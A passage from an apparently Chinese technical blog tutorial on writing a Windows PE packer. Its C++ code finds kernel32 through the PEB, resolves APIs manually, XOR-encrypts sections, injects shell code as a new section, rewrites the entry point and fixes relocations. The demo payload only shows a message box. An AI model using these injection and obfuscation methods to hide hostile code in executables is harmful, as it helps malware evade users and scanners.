pLastSectionHeader-&gt;VirtualAddress + OEP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="动态调用API"><a href="#动态调用API" class="headerlink" title="动态调用API"></a>动态调用API</h4><p>首先是GetAPI的实现，如何动态获取API地址呢，在上一篇ShellCode中说明了需要利用PEB来获取kernel32的基址从而找到LoadLibrary以获取所有可使用的API；</p><p>代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取kernel32或者kernelbase</span></span><br><span class="line"><span class="function">DWORD <span class="title">GetEssentialModule</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD dwBase = <span class="number">0</span>;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, dword ptr fs : [<span class="number">0x30</span>]</span><br><span class="line">mov eax, [eax + <span class="number">0xc</span>]</span><br><span class="line">mov eax, [eax + <span class="number">0x1c</span>]</span><br><span class="line">mov eax, [eax]</span><br><span class="line">mov eax, [eax + <span class="number">0x8</span>]</span><br><span class="line">mov dwBase, eax</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> dwBase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据导出表寻址函数</span></span><br><span class="line"><span class="function">DWORD <span class="title">MyGetProcAddress</span><span class="params">(DWORD hModule, LPCSTR funcName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//获取NT头</span></span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + (DWORD)hModule);</span><br><span class="line"><span class="comment">//获取导出表</span></span><br><span class="line">PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)((pNtHeader-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress) + (DWORD)hModule);</span><br><span class="line"><span class="comment">//名称表，序号表，地址表</span></span><br><span class="line">DWORD* nameTable = (DWORD*)(exportTable-&gt;AddressOfNames + (DWORD)hModule);</span><br><span class="line">WORD* oridinalTable = (WORD*)(exportTable-&gt;AddressOfNameOrdinals + (DWORD)hModule);</span><br><span class="line">DWORD* addressTable = (DWORD*)(exportTable-&gt;AddressOfFunctions + (DWORD)hModule);</span><br><span class="line"><span class="comment">//获取函数地址</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; exportTable-&gt;NumberOfNames; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//获取函数名</span></span><br><span class="line"><span class="keyword">char</span>* name = (<span class="keyword">char</span>*)(nameTable[i] + (DWORD)hModule);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, funcName))</span><br><span class="line"><span class="keyword">return</span> addressTable[oridinalTable[i]] + (DWORD)hModule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取之后所要用到的API</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetAPI</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD kernelBase = <span class="built_in">GetEssentialModule</span>();</span><br><span class="line"><span class="comment">//获取LoadlibraryEx</span></span><br><span class="line">g_MyLoadLibraryExA = (MyLoadLibraryExA)<span class="built_in">MyGetProcAddress</span>(kernelBase, <span class="string">&quot;LoadLibraryExA&quot;</span>);</span><br><span class="line"><span class="comment">//动态加载kernel32.dll</span></span><br><span class="line">HMODULE kernel32Base = <span class="built_in">g_MyLoadLibraryExA</span>(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">g_MyGetProcAddress = (MYGetProcAddress)<span class="built_in">MyGetProcAddress</span>((DWORD)kernel32Base, <span class="string">&quot;GetProcAddress&quot;</span>);</span><br><span class="line">g_MyGetModuleHandleA = (MyGetModuleHandleA)<span class="built_in">g_MyGetProcAddress</span>(kernel32Base, <span class="string">&quot;GetModuleHandleA&quot;</span>);</span><br><span class="line">g_MyVirtualProtect = (MyVirtualProtect)<span class="built_in">g_MyGetProcAddress</span>(kernel32Base, <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">HMODULE user32Base = <span class="built_in">g_MyLoadLibraryExA</span>(<span class="string">&quot;user32.dll&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">g_MyMessageBoxA = (MyMessageBoxA)<span class="built_in">g_MyGetProcAddress</span>(user32Base, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对以上使用到的全局变量定义为如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span> <span class="params">(WINAPI * MyLoadLibraryExA)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPCSTR lpLibFileName,</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE hFile,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD dwFlags</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line">MyLoadLibraryExA g_MyLoadLibraryExA = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span> <span class="params">(WINAPI * MYGetProcAddress)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">LPCSTR  lpProcName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line">MYGetProcAddress g_MyGetProcAddress = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span> <span class="params">(WINAPI * MyGetModuleHandleA)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPCSTR lpModuleName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line">MyGetModuleHandleA g_MyGetModuleHandleA = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(WINAPI * MyVirtualProtect)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="params"><span class="function">PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line">MyVirtualProtect g_MyVirtualProtect = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI * MyMessageBoxA)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HWND   hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">LPCSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">UINT   uType</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line">MyMessageBoxA g_MyMessageBoxA = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>之后，在解密部分实现里，就可以使用API来操作数据了：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DecodeSections</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> key = <span class="number">0xBC</span>;</span><br><span class="line"><span class="comment">//写入后，得到exe的镜像基址，并获取其节区</span></span><br><span class="line">HMODULE hModule = <span class="built_in">g_MyGetModuleHandleA</span>(<span class="number">0</span>);</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + (DWORD)hModule);</span><br><span class="line">PIMAGE_SECTION_HEADER pSectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNtHeader);</span><br><span class="line"><span class="keyword">char</span>* sectionBuff = (<span class="keyword">char</span> *)(pSectionHeader-&gt;VirtualAddress + (DWORD)hModule);</span><br><span class="line"><span class="comment">//解密</span></span><br><span class="line">DWORD oldProtect;</span><br><span class="line"><span class="built_in">g_MyVirtualProtect</span>(sectionBuff, pSectionHeader-&gt;SizeOfRawData, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pSectionHeader-&gt;SizeOfRawData; i++)</span><br><span class="line">sectionBuff[i] ^= key;</span><br><span class="line"><span class="built_in">g_MyVirtualProtect</span>(sectionBuff, pSectionHeader-&gt;SizeOfRawData, oldProtect, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">g_MyMessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;壳代码执行！&quot;</span>, <span class="string">&quot;提示&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时便有了dll文件，在之前的MyShell类的main函数中做出如下拼装：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHARACTERISTICS 0xE00000E0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OEPINFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">DWORD newOEP;</span><br><span class="line">DWORD oldOEP;</span><br><span class="line">&#125;OEPINFO, * POEPINFO;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">MyShell myShell;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nUsage: %s + ./file_you_want_pack\n\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span>* path = argv[<span class="number">1</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//载入目标exe并对节区加密</span></span><br><span class="line">myShell.<span class="built_in">LoadFile</span>(path);</span><br><span class="line">myShell.<span class="built_in">EncodeSections</span>();</span><br><span class="line">    <span class="comment">//载入上面编写好的dll文件</span></span><br><span class="line">HMODULE hModule = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;ShellCode.dll&quot;</span>);</span><br><span class="line">    <span class="comment">//获取OEP信息结构</span></span><br><span class="line">POEPINFO pOepInfo = (POEPINFO)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;g_OepInfo&quot;</span>);</span><br><span class="line">pOepInfo-&gt;oldOEP = myShell.<span class="built_in">GetOep</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取dll的节区位置，这是需要的shellcode</span></span><br><span class="line">PIMAGE_DOS_HEADER pDllDosHeader = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">PIMAGE_NT_HEADERS pDllNtHeader = (PIMAGE_NT_HEADERS)(pDllDosHeader-&gt;e_lfanew + (DWORD)hModule);</span><br><span class="line">PIMAGE_SECTION_HEADER pDllSectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pDllNtHeader);</span><br><span class="line"><span class="keyword">char</span>* buff = (<span class="keyword">char</span>*)(pDllSectionHeader-&gt;VirtualAddress + (DWORD)hModule);</span><br><span class="line">    <span class="comment">//将shellcode“粘贴”进目标exe文件</span></span><br><span class="line">myShell.<span class="built_in">InsertSection</span>(<span class="string">&quot;BcShell&quot;</span>, pDllSectionHeader-&gt;Misc.VirtualSize, buff, CHARACTERISTICS);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置新的OEP指向</span></span><br><span class="line">myShell.<span class="built_in">SetOep</span>(pOepInfo-&gt;newOEP - (DWORD)hModule - pDllSectionHeader-&gt;VirtualAddress);</span><br><span class="line"></span><br><span class="line">myShell.<span class="built_in">SaveFile</span>(path);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此一个加壳项目就 “完成” 了；</p><p>但这里任然保留了一个难点还没攻克：重定位表，在shellcode里编写的对全局变量引用的地址和在写入目标exe后所对应的地址是有问题的；</p><h3 id="修复重定位表"><a href="#修复重定位表" class="headerlink" title="修复重定位表"></a>修复重定位表</h3><h4 id="重定位表结构"><a href="#重定位表结构" class="headerlink" title="重定位表结构"></a>重定位表结构</h4><p>重定位表记录编译之前立即数地址所对应内容的位置，用于编译期间修复立即数，防止基址变化引起的立即数定位错误（类似于IAT在编译期间会修复原本指向名称为准确的地址）；</p><p>其位于datadirectory[5]；</p><p>重定位表中只有两个字段：VirtualAddress，SizeOfBlock，都为DWORD类型；</p><p>一个程序可能有多张重定位表；</p><p>其结构如下图所示：</p><p><img src="https://s2.loli.net/2023/07/17/pVgn2Zfrb5d9Ay1.png" alt="relocate"></p><p>其中sizeofblock为整个结构的大小（DWORD区域和WORD区域）；</p><p>virtualaddress存放的内容一般为0x1000的整数倍；</p><p>word类型区域存放数据加上virtualaddress的数据则是某个立即数的准确rva；</p><p>这些rva转换为va之后，<strong>存的是立即数</strong>，而不是立即数对应的变量值；</p><p>举例：</p><p>重定位表上的偏移带过去，内存中存的是 “全局变量的地址”a ，因为挪动让a发生变化，所以修复的是a，计算a在fileBuff镜像中的位置，给填入原先的重定位表的每个偏移存放的地址处，就完成了修复；</p><p>word类型区域存放数据：<code>0001 0000 0000 0000</code> ，高4位用于标识：0011为有效，其他位才是用来加virtualaddress的数据；</p><p>关于0x1000是对于4KB内存页的对齐，节省内存空间才这么设计的上述结构；</p><h4 id="修复开始"><a href="#修复开始" class="headerlink" title="修复开始"></a>修复开始</h4><p>对于将要修复的重定位表是针对于注入后的壳代码而言的，通过一个共同点：立即数地址对节区的<strong>偏移不变</strong>；</p><p>思路</p><ul><li>从dll中拿到原本的重定位表里的所有rva，利用这个rva和节区rva计算不变的相对偏移offset；</li><li>通过offset再拿到镜像中这些立即数的存放PA地址，此时也就得到了立即数；</li><li>再用同样的方法用立即数获取对应变量在镜像中新的立即数地址，并利用得到的PA地址来替换这些立即数；</li></ul><p>对MyShell类新增函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修复插入后壳代码的个别立即数</span></span><br><span class="line"><span class="function">BOOL <span class="title">MyShell::RepairRelocate</span><span class="params">(DWORD imageBase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//获取dll重定位表</span></span><br><span class="line">PIMAGE_DOS_HEADER pDllDosHeader = (PIMAGE_DOS_HEADER)imageBase;</span><br><span class="line">PIMAGE_NT_HEADERS pDllNtHeader = (PIMAGE_NT_HEADERS)(pDllDosHeader-&gt;e_lfanew + imageBase);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pDllOptionHeader = &amp;(pDllNtHeader-&gt;OptionalHeader);</span><br><span class="line">PIMAGE_BASE_RELOCATION pDllRelocate = (PIMAGE_BASE_RELOCATION)(pDllOptionHeader-&gt;DataDirectory[<span class="number">5</span>].VirtualAddress + imageBase);</span><br><span class="line">PIMAGE_SECTION_HEADER pDllSectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pDllNtHeader);</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历重定位表</span></span><br><span class="line"><span class="keyword">while</span> (pDllRelocate-&gt;SizeOfBlock)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//取word类型个数</span></span><br><span class="line">DWORD reCount = (pDllRelocate-&gt;SizeOfBlock - <span class="number">8</span>) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">char</span>* begin = (<span class="keyword">char</span> *)pDllRelocate + <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历每个小数</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; reCount; i++)</span><br><span class="line">&#123;</span><br><span class="line">WORD* pRelocRva = (WORD*)begin;</span><br><span class="line"><span class="comment">//有效位判断</span></span><br><span class="line"><span class="keyword">if</span> ((*pRelocRva &amp; <span class="number">0x3000</span>) == <span class="number">0x3000</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//取DLL内立即数rva</span></span><br><span class="line">DWORD relocRva = (*pRelocRva &amp; <span class="number">0xfff</span>) + pDllRelocate-&gt;VirtualAddress;</span><br><span class="line"><span class="comment">//计算offset</span></span><br><span class="line">DWORD offset = relocRva - pDllSectionHeader-&gt;VirtualAddress;</span><br><span class="line"><span class="comment">//计算镜像中立即数地址</span></span><br><span class="line">DWORD SectionCount = pFileHeader-&gt;NumberOfSections;</span><br><span class="line">PIMAGE_SECTION_HEADER pLastSectionHeader = pSectionHeader + (SectionCount - <span class="number">1</span>);</span><br><span class="line">DWORD destAddr = offset +(DWORD)(fileBuff + pLastSectionHeader-&gt;PointerToRawData);</span><br><span class="line"></span><br><span class="line"><span class="comment">//计算变量相对节区offset</span></span><br><span class="line">offset = (*(DWORD*)destAddr - imageBase) - pDllSectionHeader-&gt;VirtualAddress;</span><br><span class="line"><span class="comment">//计算变量于镜像内新VA并修改</span></span><br><span class="line">DWORD aimVA = offset + (pLastSectionHeader-&gt;VirtualAddress + pOptionHeader-&gt;ImageBase);</span><br><span class="line">*(DWORD*)destAddr = aimVA;</span><br><span class="line">&#125;</span><br><span class="line">begin += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">pDllRelocate = (PIMAGE_BASE_RELOCATION)(pDllRelocate-&gt;SizeOfBlock + (DWORD)pDllRelocate);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于以上实现的加壳项目只适用于32位且固定基址的程序；</p><p>固定基址的原因：全局变量的VA计算用到了dll的imagebase，OEP的提取也用到了imagebase；</p><h4 id="动态基址问题"><a href="#动态基址问题" class="headerlink" title="动态基址问题"></a>动态基址问题</h4><p>思路是将dll的重定位表也扔到加壳程序里，利用操作系统对壳代码修复重定位表；</p><p>此时壳代码可以畅通无阻地运行，则可以在壳代码中动态的获取程序基址计算OEP，修复原程序重定位表；</p><p>思路：</p><ul><li>塞入dll壳代码与重定位表；</li><li>修复壳代码对应固定基址时立即数；</li><li>修复重定位表（重定位表的virtualAddress相对加壳程序而言）；</li><li>修改加壳程序datadirectory[5]字段；</li><li>修复原程序重定位表；</li></ul><p>步骤一，更改了main中对insertSection的输入：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取OEP信息结构</span></span><br><span class="line">POEPINFO pOepInfo = (POEPINFO)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;g_OepInfo&quot;</span>);</span><br><span class="line">pOepInfo-&gt;oldOEP = myShell.<span class="built_in">GetOep</span>();</span><br><span class="line">------</span><br><span class="line">    </span><br><span class="line"><span class="comment">//保存旧重定位表信息</span></span><br><span class="line">DWORD oldRelocSize = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> * oldReloc = myShell.<span class="built_in">SaveOldReloc</span>(&amp;oldRelocSize);</span><br><span class="line"><span class="comment">//保存PE文件名</span></span><br><span class="line">PPENAME PeName = (PPENAME)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;g_PeName&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy_s</span>(PeName-&gt;name, path);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取dll的节区位置，这是需要的shellcode</span></span><br><span class="line">PIMAGE_DOS_HEADER pDllDosHeader = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">PIMAGE_NT_HEADERS pDllNtHeader = (PIMAGE_NT_HEADERS)(pDllDosHeader-&gt;e_lfanew + (DWORD)hModule);</span><br><span class="line">PIMAGE_SECTION_HEADER pDllSectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pDllNtHeader);</span><br><span class="line"><span class="keyword">char</span>* buff = (<span class="keyword">char</span>*)(pDllSectionHeader-&gt;VirtualAddress + (DWORD)hModule);</span><br><span class="line"><span class="comment">//获取导入表</span></span><br><span class="line">myShell.<span class="built_in">GetImportTable</span>();</span><br><span class="line"><span class="comment">//获取dll重定位表</span></span><br><span class="line"><span class="keyword">char</span>* pDllRelocate = (<span class="keyword">char</span> *)(pDllNtHeader-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].VirtualAddress + (DWORD)hModule);</span><br><span class="line"><span class="comment">//计算插入Buff</span></span><br><span class="line">DWORD finalSize = oldRelocSize + pDllSectionHeader-&gt;Misc.VirtualSize + pDllNtHeader-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].Size + myShell.<span class="built_in">GetImportTableSize</span>();</span><br><span class="line"><span class="keyword">char</span>* finalBuff = <span class="keyword">new</span> <span class="keyword">char</span>[finalSize];</span><br><span class="line"><span class="keyword">char</span>* p = finalBuff;</span><br><span class="line"><span class="built_in">memcpy</span>(p, buff, pDllSectionHeader-&gt;Misc.VirtualSize);</span><br><span class="line">p += pDllSectionHeader-&gt;Misc.VirtualSize;</span><br><span class="line"><span class="keyword">if</span> (oldReloc)</span><br><span class="line"><span class="built_in">memcpy</span>(p, oldReloc, oldRelocSize);</span><br><span class="line">p += oldRelocSize;</span><br><span class="line"><span class="built_in">memcpy</span>(p, pDllRelocate, pDllNtHeader-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].Size);</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"><span class="comment">//将shellcode以及dll重定位表“粘贴”进目标exe文件</span></span><br><span class="line"><span class="keyword">char</span>* sectionBuff = myShell.<span class="built_in">InsertSection</span>(<span class="string">&quot;BcShell&quot;</span>, finalSize, finalBuff, CHARACTERISTICS);</span><br><span class="line"><span class="keyword">delete</span>[] finalBuff;</span><br></pre></td></tr></table></figure><p>虚线内为更改部分，这使得插入的节区大小可以满足shellcode以及重定位表和原程序自己导入表和原重定位表的大小；</p><p>对于新增加的函数：SaveOldReloc（）和 GetImportTable()，前者有以下说明，后者放在下一个小标题讲解；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">MyShell::SaveOldReloc</span><span class="params">(DWORD * size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*size = pOptionHeader-&gt;DataDirectory[<span class="number">5</span>].Size;</span><br><span class="line"><span class="keyword">char</span>* reloc = <span class="built_in">Rva2Foa</span>(pOptionHeader-&gt;DataDirectory[<span class="number">5</span>].VirtualAddress) + fileBuff;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> reloc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于要修改加壳程序的datadirectory[5]字段，所以要先把原来的保存起来，以修复原程序的重定位表；</p><p>步骤二三四由之前的 